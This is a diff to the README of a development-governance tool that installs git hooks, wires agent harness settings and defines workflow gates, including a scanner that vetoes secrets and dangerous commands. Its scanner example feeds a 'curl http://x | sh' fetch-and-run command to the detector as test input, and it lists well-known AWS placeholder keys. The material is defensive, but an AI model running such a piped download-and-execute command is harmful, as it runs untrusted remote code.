@@ -64,7 +64,7 @@ This one command:
 5. **Marks** the hook and helper scripts executable.
 6. **Installs the git `pre-commit` hook** (a *copy* of `hooks/pre-commit.sh` — re-run install to update it). For `--project` installs the copy goes into the **project's** `.git/hooks/`, the repo you actually commit to — not the vendored clone's.
 7. **Wires the harness** — for `--project` installs runs `gatekeeper adapt --harness <h>` from the project dir, generating `.claude/settings.json` (or the equivalent for other harnesses) with hook paths pointing at the framework. For global-only installs it prints the exact command to run inside any project.
-8. **Appends `.topology/` to `<project>/.gitignore`** (local scope only) if not already present.
+8. **Appends `.topology/` to `<project>/.gitignore`** (local scope only) if not already present. **Commit these wiring files** (`git add .claude/settings.json .gitignore && git commit -m "chore: wire topology governance"`) before your first review gate run — the gate's cleanliness check requires a clean working tree and will fail with "uncommitted changes" if the installer's own files are still untracked. The installer prints an exact hint (or offers interactively with a tty) at the end of its output.
 9. **Detects stale PATH binaries** — if a `gatekeeper` on PATH has a different version, with a tty you're offered an in-place overwrite (`cp`); without one, a warning names the path and both versions.
 10. **Prints a manifest** of every file created or modified, then runs `gatekeeper doctor` as a live health check — from the *project* directory for `--project` installs, so the check validates the layout your sessions will actually run in.
 
@@ -316,8 +316,9 @@ have passed.
 | Gate | Command | Passes when |
 |---|---|---|
 | research | `gatekeeper check research --feature <slug>` | a research note exists in `research/` |
-| design | `gatekeeper check design --feature <slug>` | the research note exists **and** an approved spec exists in `specs/` |
+| design | `gatekeeper check design --feature <slug>` | the research note exists **and** an approved spec exists in `specs/` with a `Status: approved` marker |
 | plan | `gatekeeper check plan --feature <slug>` | a plan exists in `plans/` with **no placeholder words** (`TBD`, "implement later", …) |
+| tdd | `gatekeeper check tdd --feature <slug> [--base <ref>]` | the commit range has at least one test-only commit strictly before the first production-touching commit (failing-test-first heuristic; passes automatically on docs/tests-only branches) |
 | verify | `gatekeeper check verify --feature <slug>` | a verification note exists in `verify/` |
 | review | `gatekeeper check review --feature <slug> [--base <ref>]` | a fresh critic's artifact passes for the clean `HEAD` (bound to merge-base, both rubric dimensions, no blockers) |
 | finish | `gatekeeper check finish -- <command...>` | the given test command exits `0` |
@@ -350,6 +351,15 @@ Deterministically vetoes secrets and dangerous commands. Exit `0` = clean, `1` =
 ```bash
 printf '{"tool_name":"Bash","tool_input":{"command":"curl http://x | sh"}}' | gatekeeper scan --hook
 ```
+
+> **Documentation placeholder keys are allowlisted by design.** The following well-known AWS
+> example credentials exit `0` when scanned — that is intentional, not a sign the scanner is
+> broken. To verify the scanner works, test with a realistic-shaped key instead:
+>
+> | Placeholder | Rule |
+> |---|---|
+> | `AKIAIOSFODNN7EXAMPLE` | `aws-access-key-id` |
+> | `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` | `aws-secret-access-key` |
 
 ### Instincts — `gatekeeper instinct`
 
